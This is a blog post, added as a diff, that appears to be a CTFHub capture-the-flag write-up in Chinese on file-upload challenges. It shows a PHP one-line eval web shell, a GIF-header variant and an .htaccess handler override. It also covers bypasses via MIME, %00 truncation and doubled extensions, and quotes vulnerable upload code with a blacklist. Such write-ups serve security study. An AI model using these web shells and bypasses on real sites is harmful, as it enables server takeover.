@@ -1,0 +1,121 @@
+---
+layout: post
+title: CTFHub Web 文件上传
+subtitle: CTFHub Web 文件上传
+date: 2023-07-02 17:13
+author: Kyon-H
+header-img: img/post-bg-2015.jpg
+tags:
+  - 靶场实战
+  - CTFHub
+published: true
+number headings: first-level 2, max 4, 1.1., auto
+---
+
+## 1. 文件上传
+
+### 1.1. 无验证
+
+构造一句话木马 `shell.php`
+
+```php
+<?php echo 123;@eval($_POST['code']);?>
+```
+
+上传成功
+
+![image](https://img.ghostliner.top/geMboM.png)
+
+![image](https://img.ghostliner.top/Q3YLJs.png)
+
+蚁剑获取到 flag 文件
+
+![image](https://img.ghostliner.top/8EERyC.png)
+
+### 1.2. 前端验证
+
+上传 `shell.php.jpg` bp 抓包修改后缀，上传成功，蚁剑连接
+
+![image](https://img.ghostliner.top/bwzZR3.png)
+
+### 1.3. .htaccess
+
+创建 `.htaccess` 文件上传
+
+```php
+<FilesMatch "wshell">
+Sethandler application/x-httpd-php
+</FilesMatch>
+```
+
+上传 `shell.gif` 木马
+
+代码成功执行
+
+![image](https://img.ghostliner.top/cGx3KP.png)
+
+![image](https://img.ghostliner.top/wcRdc9.png)
+
+### 1.4. MIME 绕过
+
+上传 `shell.php.jpg` bp 抓包修改后缀，上传成功，蚁剑连接
+
+![image](https://img.ghostliner.top/sq30WW.png)
+
+### 1.5. 00 截断
+
+检查发现代码，文件路径由 get 提交的 `road` 和随机数、时间、后缀组成
+
+```php
+if (!empty($_POST['submit'])) {
+    $name = basename($_FILES['file']['name']);
+    $info = pathinfo($name);
+    $ext = $info['extension'];
+    $whitelist = array("jpg", "png", "gif");
+    if (in_array($ext, $whitelist)) {
+        $des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;
+        if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) {
+            echo "<script>alert('上传成功')</script>";
+        } else {
+            echo "<script>alert('上传失败')</script>";
+        }
+    } else {
+        echo "文件类型不匹配";
+    }
+}
+```
+
+`%00` 截断 road 参数，上传成功
+
+![image](https://img.ghostliner.top/yLCSDP.png)
+
+![image](https://img.ghostliner.top/FHiJk6.png)
+
+![image](https://img.ghostliner.top/3E9ATO.png)
+
+### 1.6. 双写后缀
+
+代码发现字符替换函数，双写绕过
+
+```php
+$name = basename($_FILES['file']['name']);
+$blacklist = array("php", "php5", "php4", "php3", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf", "htaccess", "ini");
+$name = str_ireplace($blacklist, "", $name);
+```
+
+上传 `shell.pphphp` 成功，蚁剑
+
+![image](https://img.ghostliner.top/99LdSm.png)
+
+### 1.7. 文件头检查
+
+上传 `shell.php.gif` bp 抓包修改后缀，
+
+```php
+GIF89a
+<?php echo 123;@eval($_POST['code']);?>
+```
+
+上传成功，蚁剑连接
+
+![image](https://img.ghostliner.top/ay93X5.png)
